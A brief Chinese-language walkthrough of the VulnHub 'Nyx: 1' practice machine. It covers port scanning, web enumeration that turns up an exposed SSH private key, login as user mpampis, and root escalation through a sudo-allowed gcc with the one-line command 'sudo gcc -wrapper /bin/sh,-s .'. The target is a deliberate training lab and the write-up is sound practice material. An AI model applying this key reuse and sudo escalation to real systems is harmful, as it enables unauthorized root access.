# Nyx: 1

2024-6-12 https://www.vulnhub.com/entry/nyx-1,535/

difficulty: Easy

## IP

192.168.10.195

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 fc8b87f436cd7d0fd8f31615a947f10b (RSA)
|   256 b45c089602c6a80b01fd4968ddaafb3a (ECDSA)
|_  256 cbbf2293697660a47dc019f3c715e73c (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: nyx
|_http-server-header: Apache/2.4.38 (Debian)
```

直接看 80 web 服务，首页没提示，源码也没重要的信息，使用 gobuster 进行扫描:

```
http://192.168.10.195/key.php
```

也是要输入 key 才能进入，尝试使用弱密码进行爆破，但是没发现。

使用 nikto 进行扫描，发现一个后门 ssh 密钥文件链接: http://192.168.10.195/d41d8cd98f00b204e9800998ecf8427e.php

对私钥再次进行 base64 解码，在最后结尾发现了对应的用户名 mpampis 尝试使用私钥登陆，能够成功登陆。

发现 user flag：

```
mpampis@nyx:~$ cat user.txt
2cb67a256530577868009a5944d12637
```

sudo -l 有显示：

```
(root) NOPASSWD: /usr/bin/gcc
```

可以直接利用：

```
sudo gcc -wrapper /bin/sh,-s .

# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
```
